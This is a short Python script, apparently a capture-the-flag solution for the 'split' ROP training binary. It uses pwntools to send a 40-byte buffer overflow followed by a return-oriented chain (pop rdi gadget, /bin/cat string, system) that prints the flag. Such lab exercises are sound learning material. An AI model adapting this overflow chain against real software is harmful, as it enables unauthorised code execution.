  GNU nano 4.5                                  exploit.py                                  Modified  
#!/usr/bin/python

from pwn import *
import re

cat = '\x60\x10\x60\x00\x00\x00\x00\x00'
system = "\x4b\x07\x40\x00\x00\x00\x00\x00"
gadget = "\xc3\x07\x40\x00\x00\x00\x00\x00"

r = process("./split")

#Take the PID of the proccess for the GDB
pid=r.pid   
print(r.pid)
print()

input()

conn =  r.recvuntil("data...")
print(conn)
print()

#Create payload 40 bytes plus the gadget, the system call and the /bin/cat address and send it
payload = 'A' * 40
payload += gadget #pop rdi, ret
payload += cat   
payload += system
r.sendline(payload)
print(payload)

conn =  r.recvuntil("you!")
print(conn)
print()


conn = r.recvuntil("flag!}")
print(conn)
